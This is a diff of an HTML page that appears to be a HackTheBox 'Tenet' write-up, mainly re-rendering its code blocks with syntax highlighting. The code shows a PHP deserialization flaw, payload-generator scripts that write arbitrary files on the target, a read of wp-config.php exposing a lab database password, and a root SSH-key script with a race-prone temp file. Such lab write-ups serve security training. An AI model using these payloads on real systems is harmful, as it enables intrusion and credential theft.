@@ -4,6 +4,7 @@
 		<meta charset="utf-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
 		<link rel="stylesheet" href="/assets/css/main.css" />
+		<link rel="stylesheet" href="/assets/css/main.css" />
 		<noscript><link rel="stylesheet" href="/assets/css/noscript.css" /></noscript>
 	</head>
 	<body class="is-preload">
@@ -43,7 +44,7 @@
 		    </section>
 
       <section id="wrapper">
-<section class="wrapper spotlight style3 ">
+<section class="wrapper spotlight style1 ">
 <div class="inner">
 <div class="main_image"><img src=/images/writeups/htb_machines/tenet/tenet.png alt="" /></div>
 <div class="content">
@@ -67,7 +68,7 @@
 </div>
 </div>
 </section>
-<section class="wrapper style2 alt">
+<section class="wrapper style3 alt">
 <div class="inner">
 <div class="content">
 
@@ -77,25 +78,27 @@
 <p>
  Now I could of assumed that the box had a web server and SSH open, since most boxes have those ports open. Alas, I went down the conservative route and just did the usual Nmap scan.
 </p>
-<pre class="codehilite"><code>Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-17 09:51 AWST
-Nmap scan report for tenet.htb (10.10.10.223)
-Host is up (0.059s latency).
+<div class="codehilite">
+ <pre><span></span><code><span class="nt">Starting</span><span class="w"> </span><span class="nt">Nmap</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">91</span><span class="w"> </span><span class="o">(</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="w"> </span><span class="o">)</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">2021-01-17</span><span class="w"> </span><span class="nt">09</span><span class="p">:</span><span class="nd">51</span><span class="w"> </span><span class="nt">AWST</span><span class="w"></span>
+<span class="nt">Nmap</span><span class="w"> </span><span class="nt">scan</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">for</span><span class="w"> </span><span class="nt">tenet</span><span class="p">.</span><span class="nc">htb</span><span class="w"> </span><span class="o">(</span><span class="nt">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">10</span><span class="p">.</span><span class="nc">223</span><span class="o">)</span><span class="w"></span>
+<span class="nt">Host</span><span class="w"> </span><span class="nt">is</span><span class="w"> </span><span class="nt">up</span><span class="w"> </span><span class="o">(</span><span class="nt">0</span><span class="p">.</span><span class="nc">059s</span><span class="w"> </span><span class="nt">latency</span><span class="o">).</span><span class="w"></span>
 
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
-|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
-|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-generator: WordPress 5.6
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Tenet
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+<span class="nt">PORT</span><span class="w">   </span><span class="nt">STATE</span><span class="w"> </span><span class="nt">SERVICE</span><span class="w"> </span><span class="nt">VERSION</span><span class="w"></span>
+<span class="nt">22</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">ssh</span><span class="w">     </span><span class="nt">OpenSSH</span><span class="w"> </span><span class="nt">7</span><span class="p">.</span><span class="nc">6p1</span><span class="w"> </span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">4ubuntu0</span><span class="p">.</span><span class="nc">3</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">protocol</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">0</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="w"> </span><span class="nt">ssh-hostkey</span><span class="o">:</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nt">2048</span><span class="w"> </span><span class="nt">cc</span><span class="p">:</span><span class="nd">ca</span><span class="p">:</span><span class="nd">43</span><span class="p">:</span><span class="nd">d4</span><span class="p">:</span><span class="nd">4c</span><span class="p">:</span><span class="nd">e7</span><span class="p">:</span><span class="nd">4e</span><span class="p">:</span><span class="nd">bf</span><span class="p">:</span><span class="nd">26</span><span class="p">:</span><span class="nd">f4</span><span class="p">:</span><span class="nd">27</span><span class="p">:</span><span class="nd">ea</span><span class="p">:</span><span class="nd">b8</span><span class="p">:</span><span class="nd">75</span><span class="p">:</span><span class="nd">a8</span><span class="p">:</span><span class="nd">f8</span><span class="w"> </span><span class="o">(</span><span class="nt">RSA</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="w">   </span><span class="nt">256</span><span class="w"> </span><span class="nt">85</span><span class="p">:</span><span class="nd">f3</span><span class="p">:</span><span class="nd">ac</span><span class="p">:</span><span class="nd">ba</span><span class="p">:</span><span class="nd">1a</span><span class="p">:</span><span class="nd">6a</span><span class="p">:</span><span class="nd">03</span><span class="p">:</span><span class="nd">59</span><span class="p">:</span><span class="nd">e2</span><span class="p">:</span><span class="nd">7e</span><span class="p">:</span><span class="nd">86</span><span class="p">:</span><span class="nd">47</span><span class="p">:</span><span class="nd">e7</span><span class="p">:</span><span class="nd">3e</span><span class="p">:</span><span class="nd">3c</span><span class="p">:</span><span class="nd">00</span><span class="w"> </span><span class="o">(</span><span class="nt">ECDSA</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_</span><span class="w">  </span><span class="nt">256</span><span class="w"> </span><span class="nt">e7</span><span class="p">:</span><span class="nd">e9</span><span class="p">:</span><span class="nd">9a</span><span class="p">:</span><span class="nd">dd</span><span class="p">:</span><span class="nd">c3</span><span class="p">:</span><span class="nd">4a</span><span class="p">:</span><span class="nd">2f</span><span class="p">:</span><span class="nd">7a</span><span class="p">:</span><span class="nd">e1</span><span class="p">:</span><span class="nd">e0</span><span class="p">:</span><span class="nd">5d</span><span class="p">:</span><span class="nd">a2</span><span class="p">:</span><span class="nd">b0</span><span class="p">:</span><span class="nd">ca</span><span class="p">:</span><span class="nd">44</span><span class="p">:</span><span class="nd">a8</span><span class="w"> </span><span class="o">(</span><span class="nt">ED25519</span><span class="o">)</span><span class="w"></span>
+<span class="nt">80</span><span class="o">/</span><span class="nt">tcp</span><span class="w"> </span><span class="nt">open</span><span class="w">  </span><span class="nt">http</span><span class="w">    </span><span class="nt">Apache</span><span class="w"> </span><span class="nt">httpd</span><span class="w"> </span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">29</span><span class="w"> </span><span class="o">((</span><span class="nt">Ubuntu</span><span class="o">))</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_http-generator</span><span class="o">:</span><span class="w"> </span><span class="nt">WordPress</span><span class="w"> </span><span class="nt">5</span><span class="p">.</span><span class="nc">6</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_http-server-header</span><span class="o">:</span><span class="w"> </span><span class="nt">Apache</span><span class="o">/</span><span class="nt">2</span><span class="p">.</span><span class="nc">4</span><span class="p">.</span><span class="nc">29</span><span class="w"> </span><span class="o">(</span><span class="nt">Ubuntu</span><span class="o">)</span><span class="w"></span>
+<span class="o">|</span><span class="nt">_http-title</span><span class="o">:</span><span class="w"> </span><span class="nt">Tenet</span><span class="w"></span>
+<span class="nt">Service</span><span class="w"> </span><span class="nt">Info</span><span class="o">:</span><span class="w"> </span><span class="nt">OS</span><span class="o">:</span><span class="w"> </span><span class="nt">Linux</span><span class="o">;</span><span class="w"> </span><span class="nt">CPE</span><span class="o">:</span><span class="w"> </span><span class="nt">cpe</span><span class="o">:/</span><span class="nt">o</span><span class="p">:</span><span class="nd">linux</span><span class="p">:</span><span class="nd">linux_kernel</span><span class="w"></span>
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds
+<span class="nt">Service</span><span class="w"> </span><span class="nt">detection</span><span class="w"> </span><span class="nt">performed</span><span class="o">.</span><span class="w"> </span><span class="nt">Please</span><span class="w"> </span><span class="nt">report</span><span class="w"> </span><span class="nt">any</span><span class="w"> </span><span class="nt">incorrect</span><span class="w"> </span><span class="nt">results</span><span class="w"> </span><span class="nt">at</span><span class="w"> </span><span class="nt">https</span><span class="o">://</span><span class="nt">nmap</span><span class="p">.</span><span class="nc">org</span><span class="o">/</span><span class="nt">submit</span><span class="o">/</span><span class="w"> </span><span class="o">.</span><span class="w"></span>
+<span class="nt">Nmap</span><span class="w"> </span><span class="nt">done</span><span class="o">:</span><span class="w"> </span><span class="nt">1</span><span class="w"> </span><span class="nt">IP</span><span class="w"> </span><span class="nt">address</span><span class="w"> </span><span class="o">(</span><span class="nt">1</span><span class="w"> </span><span class="nt">host</span><span class="w"> </span><span class="nt">up</span><span class="o">)</span><span class="w"> </span><span class="nt">scanned</span><span class="w"> </span><span class="nt">in</span><span class="w"> </span><span class="nt">9</span><span class="p">.</span><span class="nc">63</span><span class="w"> </span><span class="nt">seconds</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  Like 99% of the time, the SSH port would not give me an attack vector in
  <em>
@@ -197,37 +200,39 @@ Nmap done: 1 IP address (1 host up) scanned in 9.63 seconds
  </code>
  extension is commonly used on Linux boxes for backup files; which I did forget about for a bit.
 </p>
-<pre class="codehilite"><code>&lt;?php
+<div class="codehilite">
+ <pre><span></span><code><span class="cp">&lt;?php</span>
 
-class DatabaseExport
-{
-    public $user_file = 'users.txt';
-    public $data = '';
+<span class="k">class</span> <span class="nc">DatabaseExport</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
 
-    public function update_db()
-    {
-        echo '[+] Grabbing users from text file &lt;br&gt;';
-        $this-&gt; data = 'Success';
-    }
-
-
-    public function __destruct()
-    {
-        file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);
-        echo '[] Database updated &lt;br&gt;';
-    //  echo 'Gotta get this working properly...';
-    }
-}
-
-$input = $_GET['arepo'] ?? '';
-$databaseupdate = unserialize($input);
-
-$app = new DatabaseExport;
-$app -&gt; update_db();
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">update_db</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="k">echo</span> <span class="s1">'[+] Grabbing users from text file &lt;br&gt;'</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span> <span class="na">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
+    <span class="p">}</span>
 
 
-?&gt;
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="na">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+        <span class="k">echo</span> <span class="s1">'[] Database updated &lt;br&gt;'</span><span class="p">;</span>
+    <span class="c1">//  echo 'Gotta get this working properly...';</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'arepo'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">''</span><span class="p">;</span>
+<span class="nv">$databaseupdate</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$input</span><span class="p">);</span>
+
+<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
+<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span>
+
+
+<span class="cp">?&gt;</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <strong>
   ooooooooooooOOOOOOOOOOOOooooooooooooo
@@ -267,36 +272,40 @@ $app -&gt; update_db();
   payload_gen.php
  </em>
 </p>
-<pre class="codehilite"><code>&lt;?php
+<div class="codehilite">
+ <pre><span></span><code><span class="cp">&lt;?php</span>
 
-class DatabaseExport
-{
-    public $user_file = 'users.txt';
-    public $data = '';
+<span class="k">class</span> <span class="nc">DatabaseExport</span>
+<span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">'users.txt'</span><span class="p">;</span>
+    <span class="k">public</span> <span class="nv">$data</span> <span class="o">=</span> <span class="s1">''</span><span class="p">;</span>
 
-    public function update_db()
-    {
-        $this-&gt; data = 'Success';
-    }
+    <span class="k">public</span> <span class="k">function</span> <span class="nf">update_db</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span> <span class="na">data</span> <span class="o">=</span> <span class="s1">'Success'</span><span class="p">;</span>
+    <span class="p">}</span>
 
 
-    public function __destruct()
-    {
-        file_put_contents(__DIR__ . '/' . $this -&gt;user_file, $this-&gt;data);
-    //  echo 'Gotta get this working properly...';
-    }
-}
+    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nb">file_put_contents</span><span class="p">(</span><span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">'/'</span> <span class="o">.</span> <span class="nv">$this</span> <span class="o">-&gt;</span><span class="na">user_file</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+    <span class="c1">//  echo 'Gotta get this working properly...';</span>
+    <span class="p">}</span>
+<span class="p">}</span>
 
-$app = new DatabaseExport;
-$app -&gt; update_db();
+<span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
+<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span>
 
-echo serialize($app)."\n";
+<span class="k">echo</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$app</span><span class="p">)</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
 
-?&gt;
+<span class="cp">?&gt;</span><span class="w"></span>
 </code></pre>
-<pre class="codehilite"><code>ghostccamm@kali:~/Desktop/hackthebox/machines/tenet/get_init$ php payload_gen.php
-O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:7:"Success";}
+</div>
+<div class="codehilite">
+ <pre><span></span><code><span class="n">ghostccamm</span><span class="err">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">hackthebox</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">tenet</span><span class="o">/</span><span class="n">get_init</span><span class="o">$</span><span class="w"> </span><span class="n">php</span><span class="w"> </span><span class="n">payload_gen</span><span class="o">.</span><span class="n">php</span><span class="w"></span>
+<span class="n">O</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="s2">"DatabaseExport"</span><span class="p">:</span><span class="mi">2</span><span class="p">:{</span><span class="n">s</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="s2">"user_file"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="s2">"users.txt"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="s2">"data"</span><span class="p">;</span><span class="n">s</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="s2">"Success"</span><span class="p">;}</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  So we can now see how the objects of the
  <code>
@@ -368,30 +377,32 @@ O:14:"DatabaseExport":2:{s:9:"user_file";s:9:"users.txt";s:4:"data";s:7:"Success
 <p>
  I wrote a neat little Python script that will construct the payload that I will send to the server. The serialized string needed to be URL encoded as well, since it is sent as a GET parameter in the URL.
 </p>
-<pre class="codehilite"><code>import sys, urllib.parse
+<div class="codehilite">
+ <pre><span></span><code><span class="kn">import</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">urllib.parse</span>
 
-def main(filename):
-    lines = []
+<span class="k">def</span> <span class="nf">main</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+    <span class="n">lines</span> <span class="o">=</span> <span class="p">[]</span>
 
-    data = ""
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">""</span>
 
-    for line in sys.stdin:
-        data = data + line
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">data</span> <span class="o">+</span> <span class="n">line</span>
 
-    payload = 'O:14:"DatabaseExport":2:{{s:9:"user_file";s:{}:"{}";s:4:"data";s:{}:"{}";}}'.format(len(filename), filename, len(data), data)
+    <span class="n">payload</span> <span class="o">=</span> <span class="s1">'O:14:"DatabaseExport":2:{{s:9:"user_file";s:</span><span class="si">{}</span><span class="s1">:"</span><span class="si">{}</span><span class="s1">";s:4:"data";s:</span><span class="si">{}</span><span class="s1">:"</span><span class="si">{}</span><span class="s1">";}}'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">filename</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">data</span><span class="p">)</span>
 
-    print(urllib.parse.quote_plus(payload))
+    <span class="nb">print</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
 
 
-if __name__ == "__main__":
-    try:
-        filename = sys.argv[1]
-    except:
-        print("You need to give a file name!")
-        sys.exit(1)
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">"You need to give a file name!"</span><span class="p">)</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
 
-    main(filename)
+    <span class="n">main</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
 </code></pre>
+</div>
 <p>
  I then just piped the
  <code>
@@ -434,37 +445,39 @@ if __name__ == "__main__":
  </code>
  I found what I was looking for.
 </p>
-<pre class="codehilite"><code>$ cat /var/www/html/wordpress/wp-config.php
-&lt;?php
-/**
- * The base configuration for WordPress
- *
- * The wp-config.php creation script uses this file during the
- * installation. You don't have to use the web site, you can
- * copy this file to "wp-config.php" and fill in the values.
- *
- * This file contains the following configurations:
- *
- * * MySQL settings
- * * Secret keys
- * * Database table prefix
- * * ABSPATH
- *
- * @link https://wordpress.org/support/article/editing-wp-config-php/
- *
- * @package WordPress
- */
+<div class="codehilite">
+ <pre><span></span><code><span class="nx">$</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="o">/</span><span class="kd">var</span><span class="err">/www/html/wordpress/wp-config.php</span><span class="w"></span>
+<span class="cp">&lt;?php</span>
+<span class="sd">/**</span>
+<span class="sd"> * The base configuration for WordPress</span>
+<span class="sd"> *</span>
+<span class="sd"> * The wp-config.php creation script uses this file during the</span>
+<span class="sd"> * installation. You don't have to use the web site, you can</span>
+<span class="sd"> * copy this file to "wp-config.php" and fill in the values.</span>
+<span class="sd"> *</span>
+<span class="sd"> * This file contains the following configurations:</span>
+<span class="sd"> *</span>
+<span class="sd"> * * MySQL settings</span>
+<span class="sd"> * * Secret keys</span>
+<span class="sd"> * * Database table prefix</span>
+<span class="sd"> * * ABSPATH</span>
+<span class="sd"> *</span>
+<span class="sd"> * @link https://wordpress.org/support/article/editing-wp-config-php/</span>
+<span class="sd"> *</span>
+<span class="sd"> * @package WordPress</span>
+<span class="sd"> */</span>
 
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define( 'DB_NAME', 'wordpress' );
+<span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
+<span class="sd">/** The name of the database for WordPress */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wordpress'</span> <span class="p">);</span>
 
-/** MySQL database username */
-define( 'DB_USER', 'neil' );
+<span class="sd">/** MySQL database username */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'neil'</span> <span class="p">);</span>
 
-/** MySQL database password */
-define( 'DB_PASSWORD', 'Opera2112' );
+<span class="sd">/** MySQL database password */</span>
+<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'Opera2112'</span> <span class="p">);</span>
 </code></pre>
+</div>
 <p>
  Now I would normally check the contents of the database first, but for some reason I decided to see if I could login as
  <code>
@@ -501,7 +514,7 @@ define( 'DB_PASSWORD', 'Opera2112' );
 </div>
 </div>
 </section>
-<section class="wrapper style6 alt">
+<section class="wrapper style4 alt">
 <div class="inner">
 <div class="content">
 
@@ -534,59 +547,61 @@ define( 'DB_PASSWORD', 'Opera2112' );
   enableSSH.sh
  </em>
 </p>
-<pre class="codehilite"><code>neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
-#!/bin/bash
+<div class="codehilite">
+ <pre><span></span><code><span class="n">neil</span><span class="nv">@tenet</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">enableSSH</span><span class="p">.</span><span class="n">sh</span><span class="w"></span>
+<span class="err">#!</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"></span>
 
-checkAdded() {
+<span class="n">checkAdded</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
 
-    sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
+<span class="w">    </span><span class="n">sshName</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="err">$</span><span class="k">key</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cut</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="ss">" "</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="mi">3</span><span class="p">)</span><span class="w"></span>
 
-    if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="n">[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) </span><span class="o">]</span><span class="err">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"></span>
 
-        /bin/echo "Successfully added $sshName to authorized_keys file!"
+<span class="w">        </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="ss">"Successfully added $sshName to authorized_keys file!"</span><span class="w"></span>
 
-    else
+<span class="w">    </span><span class="k">else</span><span class="w"></span>
 
-        /bin/echo "Error in adding $sshName to authorized_keys file!"
+<span class="w">        </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="ss">"Error in adding $sshName to authorized_keys file!"</span><span class="w"></span>
 
-    fi
+<span class="w">    </span><span class="n">fi</span><span class="w"></span>
 
-}
+<span class="err">}</span><span class="w"></span>
 
-checkFile() {
+<span class="n">checkFile</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
 
-    if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="n">[ ! -s $1 </span><span class="o">]</span><span class="err">]</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">[</span><span class="n">[ ! -f $1 </span><span class="o">]</span><span class="err">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"></span>
 
-        /bin/echo "Error in creating key file!"
+<span class="w">        </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="ss">"Error in creating key file!"</span><span class="w"></span>
 
-        if [[ -f $1 ]]; then /bin/rm $1; fi
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="n">[ -f $1 </span><span class="o">]</span><span class="err">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">rm</span><span class="w"> </span><span class="err">$</span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="n">fi</span><span class="w"></span>
 
-        exit 1
+<span class="w">        </span><span class="k">exit</span><span class="w"> </span><span class="mi">1</span><span class="w"></span>
 
-    fi
+<span class="w">    </span><span class="n">fi</span><span class="w"></span>
 
-}
+<span class="err">}</span><span class="w"></span>
 
-addKey() {
+<span class="n">addKey</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
 
-    tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+<span class="w">    </span><span class="n">tmpName</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">mktemp</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">ssh</span><span class="o">-</span><span class="n">XXXXXXXX</span><span class="p">)</span><span class="w"></span>
 
-    (umask 110; touch $tmpName)
+<span class="w">    </span><span class="p">(</span><span class="n">umask</span><span class="w"> </span><span class="mi">110</span><span class="p">;</span><span class="w"> </span><span class="n">touch</span><span class="w"> </span><span class="err">$</span><span class="n">tmpName</span><span class="p">)</span><span class="w"></span>
 
-    /bin/echo $key &gt;&gt;$tmpName
+<span class="w">    </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">echo</span><span class="w"> </span><span class="err">$</span><span class="k">key</span><span class="w"> </span><span class="o">&gt;&gt;</span><span class="err">$</span><span class="n">tmpName</span><span class="w"></span>
 
-    checkFile $tmpName
+<span class="w">    </span><span class="n">checkFile</span><span class="w"> </span><span class="err">$</span><span class="n">tmpName</span><span class="w"></span>
 
-    /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
+<span class="w">    </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">cat</span><span class="w"> </span><span class="err">$</span><span class="n">tmpName</span><span class="w"> </span><span class="o">&gt;&gt;/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="o">/</span><span class="n">authorized_keys</span><span class="w"></span>
 
-    /bin/rm $tmpName
+<span class="w">    </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">rm</span><span class="w"> </span><span class="err">$</span><span class="n">tmpName</span><span class="w"></span>
 
-}
+<span class="err">}</span><span class="w"></span>
 
-key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
-addKey
-checkAdded
+<span class="k">key</span><span class="o">=</span><span class="ss">"ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"</span><span class="w"></span>
+<span class="n">addKey</span><span class="w"></span>
+<span class="n">checkAdded</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  Oh that is a pretty neat
  <s>
@@ -617,16 +632,18 @@ checkAdded
  </code>
